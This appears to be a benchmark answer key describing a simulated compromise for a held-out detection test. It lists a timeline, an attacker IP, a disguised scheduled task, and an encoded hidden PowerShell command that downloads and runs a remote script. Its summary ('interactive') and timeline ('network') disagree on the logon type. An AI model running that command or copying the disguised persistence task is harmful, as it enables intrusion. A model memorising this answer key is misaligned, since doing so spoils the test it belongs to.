# Ground Truth: ev-S23

**Scenario:** Evidence Vacuum v3 HELD-OUT TEST scenario S23 (task, MALICIOUS).

**Generated:** 2026-11-03 13:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **hana.ito** on **WS-HITO-01**: Interactive logon
2. **hana.ito** on **WS-HITO-01**: Hidden PowerShell task for persistence


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2026-11-03 13:35:44 UTC | hana.ito | WS-HITO-01 | Logon | Network logon from 139.162.174.124 (LogonID: 0x7c71db5) |
| 2026-11-03 13:41:04 UTC | hana.ito | WS-HITO-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\SyncCheck |


## Indicators of Compromise (IOCs)

### Network IOCs

- 139.162.174.124 (Attacker IP)

### Process IOCs

- Scheduled Task: \Microsoft\Windows\SyncCheck

### User IOCs

- hana.ito (compromised account)

### File IOCs

- powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADYANgAvAHMALgBwAHMAMQApAA==
